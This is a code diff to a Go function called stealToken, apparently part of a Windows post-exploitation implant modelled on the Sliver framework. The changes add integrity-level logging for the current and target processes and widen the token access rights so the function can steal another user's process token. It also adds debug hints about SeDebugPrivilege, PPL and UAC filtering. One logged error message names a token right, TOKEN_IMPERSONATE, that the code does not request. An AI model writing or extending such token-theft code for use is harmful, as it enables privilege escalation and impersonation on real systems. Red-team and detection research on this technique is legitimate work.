@@ -190,6 +190,36 @@ func stealToken(pid uint32) (string, error) {
 					debugLog.WriteString(fmt.Sprintf("[DEBUG] Current identity: %s\\%s\n", processDomain, processUsername))
 				}
 			}
+			
+			// Check current process integrity level
+			var integrityLevel uint32
+			var returnedLen uint32
+			err = windows.GetTokenInformation(processToken, windows.TokenIntegrityLevel, nil, 0, &returnedLen)
+			if returnedLen > 0 {
+				buffer := make([]byte, returnedLen)
+				err = windows.GetTokenInformation(processToken, windows.TokenIntegrityLevel, &buffer[0], returnedLen, &returnedLen)
+				if err == nil {
+					pSidAndAttr := (*windows.SIDAndAttributes)(unsafe.Pointer(&buffer[0]))
+					subAuthCount := pSidAndAttr.Sid.SubAuthorityCount()
+					if subAuthCount > 0 {
+						integrityLevel = pSidAndAttr.Sid.SubAuthority(uint32(subAuthCount - 1))
+						var integrityStr string
+						switch integrityLevel {
+						case 0x1000:
+							integrityStr = "Low"
+						case 0x2000:
+							integrityStr = "Medium"
+						case 0x3000:
+							integrityStr = "High"
+						case 0x4000:
+							integrityStr = "System"
+						default:
+							integrityStr = fmt.Sprintf("0x%x", integrityLevel)
+						}
+						debugLog.WriteString(fmt.Sprintf("[DEBUG] Current process integrity level: %s (0x%x)\n", integrityStr, integrityLevel))
+					}
+				}
+			}
 		}
 	}
 
@@ -197,7 +227,7 @@ func stealToken(pid uint32) (string, error) {
 	debugLog.WriteString(fmt.Sprintf("[DEBUG] Calling OpenProcess for PID %d...\n", pid))
 	hProcess, err := windows.OpenProcess(
 		windows.PROCESS_QUERY_INFORMATION,
-		true,
+		true, // inheritHandle - must be true
 		pid,
 	)
 	if err != nil {
@@ -216,26 +246,55 @@ func stealToken(pid uint32) (string, error) {
 			targetUsername, targetDomain, _, _ := tokenUser.User.Sid.LookupAccount("")
 			debugLog.WriteString(fmt.Sprintf("[DEBUG] Target process owner: %s\\%s\n", targetDomain, targetUsername))
 		}
+		
+		// Check target process integrity level
+		var returnedLen uint32
+		err = windows.GetTokenInformation(queryToken, windows.TokenIntegrityLevel, nil, 0, &returnedLen)
+		if returnedLen > 0 {
+			buffer := make([]byte, returnedLen)
+			err = windows.GetTokenInformation(queryToken, windows.TokenIntegrityLevel, &buffer[0], returnedLen, &returnedLen)
+			if err == nil {
+				pSidAndAttr := (*windows.SIDAndAttributes)(unsafe.Pointer(&buffer[0]))
+				subAuthCount := pSidAndAttr.Sid.SubAuthorityCount()
+				if subAuthCount > 0 {
+					integrityLevel := pSidAndAttr.Sid.SubAuthority(uint32(subAuthCount - 1))
+					var integrityStr string
+					switch integrityLevel {
+					case 0x1000:
+						integrityStr = "Low"
+					case 0x2000:
+						integrityStr = "Medium"
+					case 0x3000:
+						integrityStr = "High"
+					case 0x4000:
+						integrityStr = "System"
+					default:
+						integrityStr = fmt.Sprintf("0x%x", integrityLevel)
+					}
+					debugLog.WriteString(fmt.Sprintf("[DEBUG] Target process integrity level: %s (0x%x)\n", integrityStr, integrityLevel))
+				}
+			}
+		}
+		
 		queryToken.Close()
 	}
 
-	// Open process token - try TOKEN_DUPLICATE first (most restrictive)
-	debugLog.WriteString("[DEBUG] Calling OpenProcessToken with TOKEN_DUPLICATE|TOKEN_QUERY...\n")
+	// Open process token with TOKEN_DUPLICATE | TOKEN_ASSIGN_PRIMARY | TOKEN_QUERY (exactly like Sliver)
+	debugLog.WriteString("[DEBUG] Calling OpenProcessToken with TOKEN_DUPLICATE|TOKEN_ASSIGN_PRIMARY|TOKEN_QUERY...\n")
 	var primaryToken windows.Token
 	err = windows.OpenProcessToken(
 		hProcess,
-		windows.TOKEN_DUPLICATE|windows.TOKEN_QUERY,
+		windows.TOKEN_DUPLICATE|windows.TOKEN_ASSIGN_PRIMARY|windows.TOKEN_QUERY,
 		&primaryToken,
 	)
 	if err != nil {
-		debugLog.WriteString(fmt.Sprintf("[DEBUG] TOKEN_DUPLICATE|TOKEN_QUERY failed: %v\n", err))
+		debugLog.WriteString(fmt.Sprintf("[DEBUG] TOKEN_DUPLICATE|TOKEN_IMPERSONATE|TOKEN_QUERY failed: %v\n", err))
 		
-		// Cross-user token theft requires SYSTEM privileges
-		// Try to provide helpful error message
-		debugLog.WriteString("[DEBUG] Cross-user token theft typically requires SYSTEM privileges\n")
-		debugLog.WriteString("[DEBUG] Current user is setup (admin), target may be different user\n")
+		// This should work with SeDebugPrivilege at high integrity
+		// If it doesn't, there may be additional protections (Protected Process, PPL, etc.)
+		debugLog.WriteString("[DEBUG] Possible causes: Protected Process, PPL, or UAC filtering\n")
 		
-		return debugLog.String() + output, fmt.Errorf("OpenProcessToken failed: %v (cross-user token theft requires SYSTEM privileges)", err)
+		return debugLog.String() + output, fmt.Errorf("OpenProcessToken failed: %v", err)
 	}
 	defer primaryToken.Close()
 	debugLog.WriteString(fmt.Sprintf("[DEBUG] OpenProcessToken succeeded, token: 0x%x\n", primaryToken))
